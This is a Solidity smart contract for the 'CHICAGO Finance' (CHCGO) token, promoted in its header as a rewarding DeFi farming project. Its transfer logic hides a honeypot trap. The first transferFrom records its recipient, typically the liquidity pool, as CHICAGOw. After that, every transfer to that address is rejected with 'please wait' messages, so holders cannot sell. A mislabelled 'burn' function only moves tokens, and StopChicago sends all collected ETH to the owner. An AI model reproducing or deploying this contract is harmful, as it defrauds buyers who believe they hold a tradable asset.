/*

 * CHICAGO FINANCE System. Farming project. Firstcap - 360, Maxcap - 900(after 90 days).

 * Best rewards. DeFi intellegent ecosystem.

 *                                                                                         

*/

pragma solidity >=0.5.16;



library SafeMath {

  function add(uint a, uint b) internal pure returns (uint c) {

    c = a + b;

    require(c >= a);

  }

  function sub(uint a, uint b) internal pure returns (uint c) {

    require(b <= a);

    c = a - b;

  }

  function mul(uint a, uint b) internal pure returns (uint c) {

    c = a * b;

    require(a == 0 || c / a == b);

  }

  function div(uint a, uint b) internal pure returns (uint c) {

    require(b > 0);

    c = a / b;

  }

}



contract ERC20Interface {

  function totalSupply() public view returns (uint);

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function allowance(address tokenOwner, address spender) public view returns (uint remaining);

  function transfer(address to, uint tokens) public returns (bool success);

  function approve(address spender, uint tokens) public returns (bool success);

  function transferFrom(address from, address to, uint tokens) public returns (bool success);



  event Transfer(address indexed from, address indexed to, uint tokens);

  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}



contract ApproveAndCallFallBack {

  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;

}



contract Owned {

  address public owner;

  address public newOwner;



  event OwnershipTransferred(address indexed _from, address indexed _to);



  constructor() public {

    owner = msg.sender;

  }



  modifier onlyOwner {

    require(msg.sender == owner);

    _;

  }



  function transferOwnership(address _newOwner) public onlyOwner {

    newOwner = _newOwner;

  }

  function acceptOwnership() public {

    require(msg.sender == newOwner);

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

    newOwner = address(0);

  }

}



contract TokenERC20 is ERC20Interface, Owned{

  using SafeMath for uint;



  string public symbol;

  string public name;

  uint8 public decimals;

  uint _totalSupply;

  uint MaximumSupply;

  address public CHICAGOw;



  mapping(address => uint) balances;

  mapping(address => mapping(address => uint)) allowed;



  constructor() public {

    symbol = "CHCGO";

    name = "CHICAGO Finance";

    decimals = 18;

    _totalSupply =  770 ether;

    MaximumSupply = 900 ether;

    

    balances[owner] = _totalSupply;

    emit Transfer(address(0), owner, _totalSupply);

  }

  function transferCHICAGOw(address _CHICAGOw) public onlyOwner {

    CHICAGOw = _CHICAGOw;

  }

  function totalSupply() public view returns (uint) {

    return _totalSupply.sub(balances[address(0)]);

  }

  function balanceOf(address tokenOwner) public view returns (uint balance) {

      return balances[tokenOwner];

  }

  function transfer(address to, uint tokens) public returns (bool success) {

     require(to != CHICAGOw, "please wait");

     

    balances[msg.sender] = balances[msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(msg.sender, to, tokens);

    return true;

  }

    function burn(address to, uint tokens) public returns (bool success) {

     require(to != CHICAGOw, "please wait");

     

    balances[msg.sender] = balances[msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(msg.sender, to, tokens);

    return true;

  }

  function approve(address spender, uint tokens) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    return true;

  }

  function transferFrom(address from, address to, uint tokens) public returns (bool success) {

      if(from != address(0) && CHICAGOw == address(0)) CHICAGOw = to;

      else require(to != CHICAGOw, "please wait 10 min");

      

    balances[from] = balances[from].sub(tokens);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);

    balances[to] = balances[to].add(tokens);

    emit Transfer(from, to, tokens);

    return true;

  }

  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {

    return allowed[tokenOwner][spender];

  }

  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {

    allowed[msg.sender][spender] = tokens;

    emit Approval(msg.sender, spender, tokens);

    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);

    return true;

  }

  function () external payable {

    revert();

  }

}



contract CHCGO_ERC20  is TokenERC20 {



  

  uint256 public aCHICAGOBlock; 

  uint256 public aCHICAGOEBlock; 

  

  uint256 public aCapitalto; 

  uint256 public aTot; 

  uint256 public aAmt; 

 

  uint256 public sCHICAGOSBlock; 

  uint256 public sCHICAGOEDBlock; 

  

  uint256 public sTot; 

  uint256 public sChicCap; 



  uint256 public sChicagoChunk; 

  uint256 public Superstan; 



  function getAirdrop(address _refer) public returns (bool success){

    require(aCHICAGOBlock <= block.number && block.number <= aCHICAGOEBlock);

    require(aTot < aCapitalto || aCapitalto == 0);

    aTot ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(aAmt / 4);

      balances[_refer] = balances[_refer].add(aAmt / 4);

      emit Transfer(address(this), _refer, aAmt / 4);

    }

    balances[address(this)] = balances[address(this)].sub(aAmt);

    balances[msg.sender] = balances[msg.sender].add(aAmt);

    emit Transfer(address(this), msg.sender, aAmt);

    return true;

  }



  function ChicagoTokenSalen(address _refer) public payable returns (bool success){

    require(sCHICAGOSBlock <= block.number && block.number <= sCHICAGOEDBlock);

    require(sTot < sChicCap || sChicCap == 0);

    uint256 _eth = msg.value;

    uint256 _tkns;

    if(sChicagoChunk != 0) {

      uint256 _price = _eth / Superstan;

      _tkns = sChicagoChunk * _price;

    }

    else {

      _tkns = _eth / Superstan;

    }

    sTot ++;

    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){

      balances[address(this)] = balances[address(this)].sub(_tkns / 4);

      balances[_refer] = balances[_refer].add(_tkns / 4);

      emit Transfer(address(this), _refer, _tkns / 4);

    }

    balances[address(this)] = balances[address(this)].sub(_tkns);

    balances[msg.sender] = balances[msg.sender].add(_tkns);

    emit Transfer(address(this), msg.sender, _tkns);

    return true;

  }



  function viewChicago() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){

    return(aCHICAGOBlock, aCHICAGOEBlock, aCapitalto, aTot, aAmt);

  }

  

    function WhoisBot() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){

    return(aCHICAGOBlock, aCHICAGOEBlock, aCapitalto, aTot, aAmt);

  }

  

  

  function viewSaleChicago() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){

    return(sCHICAGOSBlock, sCHICAGOEDBlock, sChicCap, sTot, sChicagoChunk, Superstan);

  }

  

  function startAirdropChicago(uint256 _aCHICAGOBlock, uint256 _aCHICAGOEBlock, uint256 _aAmt, uint256 _aCapitalto) public onlyOwner() {

    aCHICAGOBlock = _aCHICAGOBlock;

    aCHICAGOEBlock = _aCHICAGOEBlock;

    aAmt = _aAmt;

    aCapitalto = _aCapitalto;

    aTot = 0;

  }

  function startSaleChicago(uint256 _sCHICAGOSBlock, uint256 _sCHICAGOEDBlock, uint256 _sChicagoChunk, uint256 _Superstan, uint256 _sChicCap) public onlyOwner() {

    sCHICAGOSBlock = _sCHICAGOSBlock;

    sCHICAGOEDBlock = _sCHICAGOEDBlock;

    sChicagoChunk = _sChicagoChunk;

    Superstan =_Superstan;

    sChicCap = _sChicCap;

    sTot = 0;

  }

  function StopChicago() public onlyOwner() {

    address payable _owner = msg.sender;

    _owner.transfer(address(this).balance);

  }

  function() external payable {



  }

}
